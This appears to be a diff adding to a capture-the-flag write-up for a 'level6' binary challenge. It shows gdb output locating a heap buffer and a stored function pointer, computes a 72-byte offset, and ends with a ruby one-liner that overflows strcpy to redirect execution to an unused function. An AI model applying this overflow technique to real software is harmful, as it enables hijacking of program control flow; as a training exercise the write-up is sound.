@@ -13,4 +13,27 @@ With '(gdb) info functions' we can see2 functions, 'm' and 'n'.
 Function 'm' is called in 'main' but function 'n' is never used so we will try to call it.
 We will use the strcpy vulnerability to buffer overflow and pass the 'n' function address.
 
+    End of assembler dump.
+    (gdb) b*0x080484ca (set a breakpoint just after strcpy)
+    Breakpoint 1 at 0x80484ca
+    (gdb) r aaaa
+    Starting program: /home/user/level6/level6 aaaa
+
+    Breakpoint 1, 0x080484ca in main ()
+    (gdb) info register
+    eax            0x804a008	134520840
+    (gdb) x/x 0x804a008
+    0x804a008:	0x61616161
+    (gdb) x/20x 0x804a008
+    0x804a008:	0x61616161	0x00000000	0x00000000	0x00000000
+    0x804a018:	0x00000000	0x00000000	0x00000000	0x00000000
+    0x804a028:	0x00000000	0x00000000	0x00000000	0x00000000
+    0x804a038:	0x00000000	0x00000000	0x00000000	0x00000000
+    0x804a048:	0x00000000	0x00000011	0x08048468	0x00000000
+    (gdb) x/x 0x804a050
+    0x804a050:	0x08048468
+
+We can see that 'm' address is stored at 0x804a050 and our buffer start at 0x804a008.
+0x804a050 - 0x804a008 = 72 and after these 72bytes we will overwrite our 'm' function address with 'n' address
+
 $ ./level6 $(ruby -e 'print "A" * 72 + "\x54\x84\x04\x08"')
